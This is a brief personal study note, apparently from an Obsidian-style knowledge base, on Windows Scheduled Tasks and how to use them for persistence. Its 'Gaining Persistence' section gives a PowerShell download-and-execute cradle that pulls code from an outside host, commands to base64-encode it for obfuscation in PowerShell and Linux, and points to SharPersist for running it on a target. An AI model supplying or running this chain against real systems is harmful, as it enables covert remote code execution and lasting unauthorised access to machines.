---
tags:
  - knowledge
  - windows
date: 2023-09-1
---

- [[Scheduled Tasks]] can be configured to run at specific times or triggered by some event.
- This is similiar to [[Cron]].
	- Usually run with the privileges of the user who created them but admins can run tasks as other users, including SYSTEM.
# Gaining Persistence

- In powershell
	- Payload to run: `$str = 'IEX ((new-object net.webclient).downloadstring("http://jonathanpake.com/a"))'`
	- Convert to base64: `[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`
- In Linux
	- `set str 'IEX ((new-object net.webclient).downloadstring("http://jonathanpake.com/a"))'`
	- `echo -en $str | iconv -t UTF-16LE | base64 -w 0`
- Execute on target with [[SharPersist]]

